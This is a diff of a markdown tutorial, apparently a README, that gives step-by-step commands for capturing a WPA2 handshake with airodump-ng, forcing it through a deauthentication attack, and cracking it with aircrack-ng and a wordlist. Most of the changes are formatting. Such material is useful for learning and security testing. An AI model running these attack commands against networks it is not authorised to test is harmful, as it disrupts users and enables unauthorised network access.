@@ -9,9 +9,9 @@ A step-by-step walkthrough for capturing and cracking WPA2 Wi-Fi handshakes usin
 
 ```bash
 ip a
-Output
+Output:
 
-plaintext
+bash
 Copy
 Edit
 └─$ ip a
@@ -34,74 +34,62 @@ Edit
 
 ```
 
-
-✅ STEP 2: Stop Monitor Mode (to start fresh)
+🛑 STEP 2: Stop Monitor Mode (to start fresh)
 ```bash
-
 sudo airmon-ng stop wlan0mon
 ```
 It will prompt for a password. Type kali if using Kali Linux.
-```bash
-Output:
 
-plaintext
-Copy
-Edit
+
+Output:
+```bash
 PHY     Interface       Driver          Chipset
 
 phy0    wlan0mon        rtl8xxxu        Realtek Semiconductor Corp. RTL8188FTV 802.11b/g/n 1T1R 2.4G WLAN Adapter
                 (mac80211 station mode vif enabled on [phy0]wlan0)
                 (mac80211 monitor mode vif disabled for [phy0]wlan0mon)
 ```
-✅ STEP 3: Start Monitor Mode
-bash
-Copy
-Edit
+
+🚀 STEP 3: Start Monitor Mode
+```bash
 sudo airmon-ng start wlan0
+```
 It will prompt for password. Type kali if using Kali Linux.
 
 Output:
-
-plaintext
-Copy
-Edit
+```bash
 PHY     Interface       Driver          Chipset
 
 phy0    wlan0mon        rtl8xxxu        Realtek Semiconductor Corp. RTL8188FTV 802.11b/g/n 1T1R 2.4G WLAN Adapter
                 (mac80211 station mode vif enabled on [phy0]wlan0)
                 (mac80211 monitor mode vif disabled for [phy0]wlan0mon)
-✅ STEP 4: Scan for Nearby Wi-Fi Networks
-bash
-Copy
-Edit
+```
+
+📡 STEP 4: Scan for Nearby Wi-Fi Networks
+```bash
 sudo airodump-ng wlan0mon
+```
 Let it run for 10–15 seconds, then press Ctrl + C.
-
 Take note of:
-
+```bash
 BSSID (MAC) of your target network (e.g., Ankith)
 
 Channel (CH)
 
 ESSID (name)
-
+```
 Example:
 
-plaintext
-Copy
-Edit
+```bash
 3E:B7:E4:DD:3A:19  -40      122        0    0  11  180   WPA2 CCMP   PSK  Ankith
 🧾 Syntax Explanation:
-BSSID → This is the MAC address of the Wi-Fi router.
-3E:B7:E4:DD:3A:19
+BSSID → This is the MAC address of the Wi-Fi router: 3E:B7:E4:DD:3A:19
 
-CH (Channel) → The Wi-Fi channel number it's broadcasting on.
-11
+CH (Channel) → The Wi-Fi channel number it's broadcasting on: 11
 
-ESSID → The name of the network.
-Ankith
-
-✅ STEP 5: Lock onto the target and capture the handshake
+ESSID → The name of the network: Ankith
+```
+🎯 STEP 5: Lock onto the target and capture the handshake
 bash
 Copy
 Edit
@@ -110,11 +98,11 @@ This locks onto channel 11, focuses on Ankith, and saves handshake to ankith_cap
 
 Keep running until you see:
 
-plaintext
+bash
 Copy
 Edit
 WPA handshake: 3E:B7:E4:DD:3A:19
-🧪 Trigger the Handshake (Deauth Attack)
+💥 Trigger the Handshake (Deauth Attack)
 If no client is connecting or the handshake is taking too long, we can force a device to reconnect by sending deauthentication packets.
 
 bash
@@ -134,11 +122,12 @@ This sends 5 deauthentication frames to all clients connected to Ankith.
 Those clients will disconnect and auto-reconnect, triggering a WPA handshake.
 
 📱 Simple Trick
-Take your phone near the laptop or PC, turn Wi-Fi off, then turn it on again. When the respective Wi-Fi appears on the phone, click on it.
+Take your phone near the laptop or PC, turn Wi-Fi off, then turn it on again.
+When the respective Wi-Fi appears on the phone, click on it.
 WPA handshake: 3E:B7:E4:DD:3A:19 will appear on your terminal.
 
-Sample Output
-plaintext
+📋 Sample Output
+bash
 Copy
 Edit
 CH 11 ][ Elapsed: 6 mins ][ 2025-07-05 03:40 ][ WPA handshake: 3E:B7:E4:DD:3A:19
@@ -169,24 +158,24 @@ Message 3 of 4
 
 Message 4 of 4
 
-IEEE 802.1X Authentication → Key Information
-Example Key Info Flags:
+Navigate to: IEEE 802.1X Authentication → Key Information
 
-plaintext
+Example Key Info Flags:
+bash
 Copy
 Edit
-Key Type: Pairwise Key
-Key MIC: Set
-Install: Set
-Secure: Set
-Message Mapping Table:
+Key Type: Pairwise Key  
+Key MIC: Set  
+Install: Set  
+Secure: Set  
+🔢 Message Mapping Table:
 Message	Flags
 1	Key ACK = 1, Key MIC = 0, Install = 0
 2	Key MIC = 1, ACK = 0, Install = 0
 3	MIC = 1, ACK = 1, Install = 1
 4	MIC = 1, ACK = 0, Install = 0 (again)
 
-✅ You only need Message 2 to crack with Aircrack-ng.
+💡 You only need Message 2 to crack with Aircrack-ng.
 
 🔓 STEP 9: Crack the Handshake
 You’ll need a wordlist (dictionary of possible passwords).
@@ -208,8 +197,8 @@ bash
 Copy
 Edit
 aircrack-ng -w ankith_list.txt -b 3E:B7:E4:DD:3A:19 ankith_capture-04.cap
-Sample Output
-plaintext
+🧾 Sample Output
+bash
 Copy
 Edit
 Reading packets, please wait...
